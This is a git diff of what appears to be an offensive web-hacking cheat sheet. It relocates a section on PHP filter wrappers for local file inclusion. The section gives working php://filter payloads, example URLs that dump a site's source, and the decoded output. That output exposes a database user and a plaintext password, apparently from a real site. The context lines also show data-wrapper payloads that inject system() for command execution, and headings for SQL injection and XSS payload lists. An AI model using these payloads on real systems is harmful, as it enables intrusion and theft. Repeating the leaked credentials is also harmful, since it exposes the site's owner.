@@ -31,8 +31,8 @@
      - [Bypass file upload filtering](#bypass-file-upload-filtering)
      - [Bypass 401/403](#bypass-401403)
      - [Bypass password reset](#bypass-password-reset)
+  - [PHP filters](#php-filters)
   - [Open redirect](#open-web-redirect)
-  - [PHP filter](#php-filters-for-lfi)
   - [Cross Side Scripting (XSS)](#xss)
       - [Common payloads](#common-payloads)
       - [XSS to LFI](#xss-to-lfi)
@@ -228,6 +228,43 @@ GET /api/getUser + Referer : https://site.com/api/GetUser --> 200
 4. Try to figure out how token are generated
 
 <img src="/assets/img/password-reset.jpeg?raw=true"/>
+-------------------------------------------------------------------------------------------------------------
+# PHP filters
+
+```
+php://filter/convert.base64-encode/resource=
+```
+
+```
+php://filter/read=string.rot13/resource=
+```
+
+*example input:*
+
+example.com/index.php?page=`php://filter/read=string.rot13/resource=`index.php
+
+example.com/index.php?page=`php://filter/convert.base64-encode/resource=`index.php
+
+*example output:*
+
+```
+PD9waHAKJGRiX25hbWU9ImJpaHRhcHViX2RiIjsKaWYoJF9TRVJWRVJbIlNFUlZFUl9BRERSIl09PSIxMjcuMC4wLjEiKQoJJGNvbj1teXNxbF9jb25uZWN0KCJsb2NhbGhvc3QiLCJyb290IiwiIik7CmVsc2UKCSRjb249bXlzcWxfY29ubmVjdCgibG9jYWxob3N0IiwiYmlodGFwdWJfYWRtaW4iLCJCUFNAMjAxMyIpOwppZighJGNvbikKCXsKCWRpZSgiRXJyb3IgaW4gY29ubmVjdGlvbiIubXlzcWxfZXJyb3IoKSk7Cgl9Cm15c3FsX3NlbGVjdF9kYigiJGRiX25hbWUiKW9yIGRpZSgiY2Fubm90IHNlbGVjdCBEQiIpOwo/
+```
+
+*decode*
+```php
+<?php
+$db_name="bihtapub_db";
+if($_SERVER["SERVER_ADDR"]=="127.0.0.1")
+   $con=mysql_connect("localhost","root","");
+else
+   $con=mysql_connect("localhost","bihtapub_admin","BPS@2013");
+if(!$con)...
+.
+.
+?>
+
+```
 
 -------------------------------------------------------------------------------------------------------------
 # Open web redirect
@@ -854,44 +891,6 @@ http://www.test.com.ar/main.php?pagina=data:,<?system($_GET['x']);?>&x=ls
 ```
 http://www.test.com.ar/main.php?pagina=data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls
 ```
--------------------------------------------------------------------------------------------------------------
-# PHP filters for LFI
-
-```
-php://filter/convert.base64-encode/resource=
-```
-
-```
-php://filter/read=string.rot13/resource=
-```
-
-*example input:*
-
-example.com/index.php?page=`php://filter/read=string.rot13/resource=`index.php
-
-example.com/index.php?page=`php://filter/convert.base64-encode/resource=`index.php
-
-*example output:*
-
-```
-PD9waHAKJGRiX25hbWU9ImJpaHRhcHViX2RiIjsKaWYoJF9TRVJWRVJbIlNFUlZFUl9BRERSIl09PSIxMjcuMC4wLjEiKQoJJGNvbj1teXNxbF9jb25uZWN0KCJsb2NhbGhvc3QiLCJyb290IiwiIik7CmVsc2UKCSRjb249bXlzcWxfY29ubmVjdCgibG9jYWxob3N0IiwiYmlodGFwdWJfYWRtaW4iLCJCUFNAMjAxMyIpOwppZighJGNvbikKCXsKCWRpZSgiRXJyb3IgaW4gY29ubmVjdGlvbiIubXlzcWxfZXJyb3IoKSk7Cgl9Cm15c3FsX3NlbGVjdF9kYigiJGRiX25hbWUiKW9yIGRpZSgiY2Fubm90IHNlbGVjdCBEQiIpOwo/
-```
-
-*decode*
-```php
-<?php
-$db_name="bihtapub_db";
-if($_SERVER["SERVER_ADDR"]=="127.0.0.1")
-   $con=mysql_connect("localhost","root","");
-else
-   $con=mysql_connect("localhost","bihtapub_admin","BPS@2013");
-if(!$con)...
-.
-.
-?>
-
-```
-
 -------------------------------------------------------------------------------------------------------
 # SQL injection payload list
 `Generic SQL Injection Payloads`
